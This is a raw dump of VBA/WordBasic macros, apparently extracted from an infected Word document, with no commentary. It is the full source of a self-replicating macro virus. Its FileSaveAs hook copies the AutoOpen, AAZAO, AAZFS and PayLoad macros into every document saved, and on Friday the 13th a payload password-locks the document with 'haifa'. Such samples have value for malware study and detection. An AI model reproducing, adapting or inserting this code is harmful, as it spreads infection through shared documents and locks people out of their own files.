   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "PayLoad"

   Public Sub MAIN()
       Rem Neskati te!
   End Sub

   Attribute VB_Name = "AAZFS"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   Rem Dialog dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AAZAO", sTMacro$
   sTMacro$ = sMe$ + ":AAZAO"
   WordBasic.MacroCopy "Global:AAZAO", sTMacro$
   sTMacro$ = sMe$ + ":AAZFS"
   WordBasic.MacroCopy "Global:AAZFS", sTMacro$
   sTMacro$ = sMe$ + ":PayLoad"
   WordBasic.MacroCopy "Global:PayLoad", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number = 509 Then
    GoTo Done
   Else
   If Err.Number <> 102 Then
   If WordBasic.Day(WordBasic.Today()) = 13 Then
   If WordBasic.Weekday(WordBasic.Today()) = 6 Then
    WordBasic.ToolsProtectDocument DocumentPassword:="haifa", NoReset:=0, Type:=0

   End If
   End If
   End If




   End If
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If

   Done:
   End Sub
